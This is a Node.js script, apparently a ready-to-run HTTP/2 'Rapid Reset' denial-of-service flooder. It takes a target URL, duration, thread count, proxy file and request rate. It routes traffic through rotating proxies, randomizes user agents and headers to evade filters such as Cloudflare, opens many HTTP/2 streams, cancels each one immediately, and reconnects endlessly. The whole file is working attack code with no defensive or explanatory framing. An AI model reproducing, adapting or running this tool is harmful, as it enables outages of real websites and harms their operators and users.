 const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, cluster = require('cluster')
//random ua by string
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const os = require("os");
const errorHandler = error => {
//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
]

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass'
const modulee = process.argv[7].toUpperCase() 
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input || !modulee) {
	console.log('JS')
	console.error(`Ex: node ${process.argv[1]} url time thread proxy.txt rate module(uam/non)`);
 console.log('RAPID RESET @STRSTRING'.red);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}



var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
	   console.log('CHECKING ', url, '...................');
       console.log('module:',modulee);
      console.log('ISP FOUND ', url, ':', isp);
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);

const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 100;

if (cluster.isMaster) {

	console.clear()
	console.log(`@STRSTRING`.bgRed)
		, console.log(`RAPID ______ RESET`)
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
 const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting ', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= thread; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}

async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
 var operatingSystems = ["X11"];
var architectures = {
  "X11":`Linux x86_64`
};
var browserss = [
`Firefox/120.0`,
`Firefox/119.0`,
	`Firefox/118.0`,
	`Firefox/117.0`,
	`Firefox/116.0`,
	`Firefox/115.0`,
	`Firefox/114.0`,
	`Firefox/113.0`,
	`Firefox/112.0`,
	`Firefox/111.0`,
	`Firefox/110.0`,
	`Firefox/109.0`,
]
var browsers = [
"Chrome/122.0.0.0 Safari/537.36",
"Chrome/121.0.0.0 Safari/537.36",
"Chrome/119.0.0.0 Safari/537.36",

	"Chrome/118.0.0.0 Safari/537.36",
   "Chrome/117.0.0.0 Safari/537.36",
   "Chrome/116.0.0.0 Safari/537.36",
   "Chrome/115.0.0.0 Safari/537.36",
   "Chrome/114.0.0.0 Safari/537.36",
   "Chrome/113.0.0.0 Safari/537.36",
   "Chrome/112.0.0.0 Safari/537.36",
   "Chrome/111.0.0.0 Safari/537.36",
   "Chrome/110.0.0.0 Safari/537.36",
   "Chrome/109.0.0.0 Safari/537.36",
   "Chrome/108.0.0.0 Safari/537.36",	
   "Chrome/107.0.0.0 Safari/537.36",
   "Chrome/106.0.0.0 Safari/537.36",  
   
];
function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 
const randomBrowser = getRandomValue(browsers);
const randomsBrowser = getRandomValue(browserss);
const iliu = [
`Mozilla/5.0 (${randomOS}; ${randomArch}) Apple/537.36 (KHTML, like Gecko) ${randomBrowser}`,
`Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebkit/537.36 (KHTML, like Gecko) ${randomBrowser}`,
`Mozilla/5.0 (${randomOS}; ${randomArch}) Samsung/537.36 (KHTML, like Gecko) ${randomBrowser}`,
]
var uas = iliu[Math.floor(Math.random() * iliu.length)]
	const rateHeaders = [
{ "vtl": "s-maxage=9800" },
{ "X-Forwarded-For": null },
{ "Accept-Transfer": "gzip" },
{ "Virtual.machine": "Encode" },
];
const rateHeaders2 = [
{ "TTL-3": "1.5" },
{ "Geo-Stats": "USA" },
];
const rateHeaders3 = [
{ "cache-control": "no-cache" },
{ "origin": "https://" + parsed.host + "/" },
{ "A-IM": "Feed" },
];

		const hd1 = [
     {"navigator.DoNotTrack": '1'},
			//{'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
      {'navigator.rtt': '300'},
      {'X-Navigation' : ''},
		]
   
   const data=[]
   hd1.forEach(obj => {
  Object.keys(obj).forEach(key => {
   data.push(key);
  });
});
rateHeaders.forEach(obj => {
  Object.keys(obj).forEach(key => {
   data.push(key);
  });
});
rateHeaders2.forEach(obj => {
  Object.keys(obj).forEach(key => {
   data.push(key);
  });
});
rateHeaders3.forEach(obj => {
  Object.keys(obj).forEach(key => {
   data.push(key);
  });
});
	//console.log(data)
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function generateRandomStrings(minLength, maxLength) {
					const characters = '.'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
 
function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  const kyTuNgauNhien = 'abcdefghijk';
  const kyTuNgauNhienk = '0123456789qwertyuiopasfghjklzxcvbnm';
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
kill = getRandomNumber(06,20)

  for (let i = 1; i <= kill; i++) {
 funccc = data[Math.floor(Math.random() * data.length)];
 lil =   generateRandomString(1,10)+'-'+funccc;

 const key =lil;
    const value = 'false'+ generateRandomString(5,10);

    doiTuong[key] = value;
  }

  return doiTuong;
}

const doiTuongNgauNhien = taoDoiTuongNgauNhien() ;
   hd = {}
     header = {
		':authority' : parsed.host,
		
    ':path': parsed.path,
		':method': 'GET',
   
  
	 }
	 const
    scheme = 'https',
    method = 'GET',
    host = parsed.host,
    path = parsed.path,
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    acceptLanguage = 'en-US,en;q=0.5',
    acceptEncoding = 'gzip, deflate, br',
    cacheControl = 'no-cache',
    trailers = 'trailers';

const 
    dta = {
        [http2.constants.HTTP2_HEADER_METHOD]: method,
        [http2.constants.HTTP2_HEADER_PATH]: path,
        //[http2.constants.HTTP2_HEADER_AUTHORITY]: host,
        [http2.constants.HTTP2_HEADER_SCHEME]: scheme,
        //[http2.constants.HTTP2_HEADER_USER_AGENT]: uas,
        [http2.constants.HTTP2_HEADER_ACCEPT]: accept,
        [http2.constants.HTTP2_HEADER_ACCEPT_LANGUAGE]: acceptLanguage,
        [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: acceptEncoding,
        // [ http2.constants.HTTP2_HEADER_CONNECTION ]         : connection,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Pragma': 'no-cache',
        [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: cacheControl,
        [http2.constants.HTTP2_HEADER_TE]: trailers
    };

	const agent = await new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host 
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive',
       ...doiTuongNgauNhien
			//, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
		, }
	, };
	connection = await http.request(Optionsreq, (res) => {});
 connection.on('error', (err) => {
 
 if (err) return
});
 connection.on('timeout', async () => {
		return
		});
	const TLSOPTION = {
		//ciphers: cipper
		 secureProtocol:['TLSv1_3_method'] 
		, echdCurve: "X25519"
    , sigalgs:`ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256`
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	//	, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
	, };

	async function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = await tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', async function(res, socket) {

		const tlsSocket = await createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        hd['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();

	const client = await http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {  
				
					 },
       
		});
          
              
             // console.log(options)
		client.on("connect", async () => {
			setInterval(async () => {
		  	for (let i = 0; i < rps; i++) {
            function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
				  dynHeaders = {
                       ':scheme': 'https',
					"user-agent":uas,
        ...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
					...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
                         // ...doiTuongNgauNhien,                         
								  }
                                                                            
				spoof = shuffleObject({
        ...header,
        
					...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
					...hd1[Math.floor(Math.random() * hd1.length)],
          //
         
				})
			
              const oo = shuffleObject({ 
				...dynHeaders,
				...spoof,     })
              //console.log(oo)
			 //
			 

  if (modulee=== 'CF') { 
    
	const request = await client.request({...oo})
	const requesta = await client.request({...oo})
	const requestq = await client.request({...oo})
 request.on('response', (headers, flags) => {
    // Ki?m tra status code
    if (headers[':status'] === '403') {
      console.log(oo);
    }

    // X? l? n?u c?n thi?t
  });
  requesta.on('response', (headers, flags) => {
    // Ki?m tra status code
    if (headers[':status'] === '403') {
      console.log(oo);
    }

    // X? l? n?u c?n thi?t
  });
  requestq.on('response', (headers, flags) => {
    // Ki?m tra status code
    if (headers[':status'] === '403') {
      console.log(oo);
    }

    // X? l? n?u c?n thi?t
  });
  
  requesta.end(http2.constants.NO_ERROR);
    requestq.end(http2.constants.NO_ERROR);
    request.end(http2.constants.NO_ERROR)  
    client.goaway(request.id, http2.constants.NO_ERROR, Buffer.from('Goodbye'));
    client.goaway(requesta.id, http2.constants.NO_ERROR, Buffer.from('Goodbye'));
    client.goaway(requestq.id, http2.constants.NO_ERROR, Buffer.from('Goodbye'));
}else{
	const request = await client.request(dta, {
		weight: 42, 
		parent: 1,
		exclusive: false,
	})
	const requesta = await client.request(dta, {
		weight: 42, 
		parent: 1,
		exclusive: false,
	})
	const requestq = await client.request(dta, {
		weight: 42, 
		parent: 1,
		exclusive: false,
	})
	requestq.priority({
		exclusive: false,
		weight: 241,
	});
	requesta.priority({
		exclusive: false,
		weight: 241,
	});
	request.priority({
		exclusive: false,
		weight: 241,
	});
	  requesta.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    requestq.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    }
  				}
			}, interval);
      let options = {
					':path' : parsed.path,
          ':method': 'GET'
				  }
			const request1 = await client.request(options)
			const request2 = await client.request(options)
			const request3 = await client.request(options)
			const request4 = await client.request(options)
			const request5 = await client.request(options)
			const request6 = await client.request(options)
			request1.priority({
				weight:  201,
				  depends_on: 0,
				  exclusive: false
				});
		  
				request2.priority({
					weight:  101,
					  depends_on: 0,
					  exclusive: false
					});
					request3.priority({
						weight:  1,
						  depends_on: 3,
						  exclusive: false
						});
						request4.priority({
							weight:  1,
							  depends_on: 7,
							  exclusive: false
							});
							request5.priority({
								weight:  1,
								  depends_on: 0,
								  exclusive: false
								});
								request6.priority({
									weight: 242,
									  depends_on: 0,
									  exclusive: false
									});
		request1.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
   request2.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    request3.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    request4.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    request5.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
    request6.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);  
	  
	  
		});
  
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return flood()
		});

		client.on('timeout', async () => {
		await client.destroy();
		await tlsSocket.destroy();
		await socket.destroy();
		return flood()
		});



client.on("error", async (error) => {
	        if (error){
				await client.destroy();
				await tlsSocket.destroy();
				await socket.destroy();
				 return flood()
			}
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
